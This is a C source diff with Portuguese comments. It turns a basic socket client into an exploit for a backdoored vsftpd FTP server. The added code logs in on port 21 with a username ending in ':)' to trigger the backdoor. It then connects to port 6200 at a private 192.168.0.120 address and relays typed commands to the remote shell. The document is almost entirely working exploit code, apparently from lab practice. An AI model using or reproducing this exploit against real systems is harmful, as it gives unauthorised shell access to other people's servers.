@@ -15,10 +15,10 @@ short socket_create(void)
 }
 
 /** IPv4 **/
-int socket_connect(int h_socket)
+int socket_connect(int h_socket, int server_port)
 {
     int i_retval = -1;
-    int server_port = 21;
+    //int server_port = 666;
     
     struct sockaddr_in remote = {0};
     remote.sin_addr.s_addr = inet_addr("192.168.0.120");
@@ -51,7 +51,7 @@ int socket_receive(int h_socket, char *rsp, short rvc_size)
 {
     int short_ret_val = -1;
     struct timeval tv;
-    tv.tv_sec = 20;
+    tv.tv_sec = 2;
     tv.tv_usec = 0;
 
     if(0 > setsockopt(h_socket, SOL_SOCKET, SO_RCVTIMEO, (char *)&tv, sizeof(tv)))
@@ -68,10 +68,13 @@ int socket_receive(int h_socket, char *rsp, short rvc_size)
 
 int main(int argc, char *argv[])
 {
-    int h_socket = 0, read_size = 0;
-    struct sockaddr_in server;
+    int h_socket = 0, read_size = 0, bckdoor_socket = 0;
+    struct sockaddr_in server, bckdoor_remote;
     char send_to_server[100] = {0};
     char server_reply[200] = {0};
+    char user[12] = "USER knulp:)";
+    char password[11] = "PASS passwd";
+    char bckdoor_reply[200] = {0};
 
     // Criar o socket
     h_socket = socket_create();
@@ -83,7 +86,7 @@ int main(int argc, char *argv[])
     }
 
     //Conecta no servidor
-    if(0 > socket_connect(h_socket))
+    if(0 > socket_connect(h_socket, 21))
     {
         perror("A conexão falhou");
         return 1;
@@ -94,17 +97,51 @@ int main(int argc, char *argv[])
     read_size = socket_receive(h_socket, server_reply, 200);
     printf("Resposta do servidor: %s\n\n", server_reply);
 
-while(1)
-{
-    printf("Digite a mensagem: ");
-    fgets(send_to_server, 100, stdin);
+    // fazendo o login no vstpd
 
-    // Envia a mensagem para o servidor
-    socket_send(h_socket, send_to_server, strlen(send_to_server));
+    socket_send(h_socket, user, strlen(user));
+    sleep(1);
 
-    // Recebe a mensagem do servidor
-    read_size = socket_receive(h_socket, server_reply, 200);
-    printf("Resposta do servidor: %s\n\n", server_reply);
-}
+    socket_send(h_socket, password, strlen(password));
+    sleep(1);
+    
+
+    /// Explorando Backdoor ///
+
+
+    // Criando o socket
+    bckdoor_socket = socket_create();
+
+    if(-1 == bckdoor_socket)
+    {
+        printf("Nao foi possivel criar o socket");
+        return 1;
+    }
+
+    //Conectando no servidor, porta 6200
+    if(0 > socket_connect(bckdoor_socket, 6200))
+    {
+        perror("A conexão falhou");
+        return 1;
+    }
+
+    printf("Se conectou no backdoor!\n");
+    
+    while(1)
+    {
+        printf("Digite a mensagem: ");
+        fgets(send_to_server, 100, stdin);
+
+        // Envia a mensagem para o servidor
+        socket_send(bckdoor_socket, send_to_server, strlen(send_to_server));
+
+        // Recebe a mensagem do servidor
+        memset(bckdoor_reply, 0, strlen(bckdoor_reply));
+        read_size = socket_receive(bckdoor_socket, bckdoor_reply, 200);
+        printf("Resposta do servidor:\n%s\n\n", bckdoor_reply);
+    }
+
+    close(h_socket);
+    close(bckdoor_socket);
 
 }
